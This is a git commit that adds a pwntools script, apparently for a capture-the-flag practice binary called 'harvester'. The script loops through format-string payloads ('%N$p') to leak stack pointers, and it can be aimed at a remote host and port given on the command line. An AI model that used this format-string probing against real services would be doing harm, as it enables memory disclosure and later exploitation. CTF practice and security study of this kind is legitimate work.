c0468ec38eba6acfd3045d261b57351da98f1c27
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-03-01 23:20:55 +0100

    Create harvest_fuzz.py

---
+++ solvescript/practice/harvest_fuzz.py
@@ -0,0 +1,54 @@
+#!/usr/bin/python3
+# Author: Hack.You
+
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify your GDB script here for debugging
+gdbscript = '''
+init-pwndbg
+piebase
+continue
+'''.format(**locals())
+
+
+# Set up pwntools for the correct architecture
+exe = './harvester'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'warning'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Let's fuzz x values
+for i in range(41):
+    try:
+        p = start()
+        # Send the name value
+        p.recvuntil('>')
+        p.sendline('1')
+        # Format the counter
+        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
+        p.recvuntil('>')
+        p.sendline('%{}$p'.format(i).encode())
+        # Receive the response
+        p.recvuntil("Your choice is:")
+        result = p.recvline()
+        print(str(i) + ': ' + str(result))
+        p.close()
+    except EOFError:
+        pass
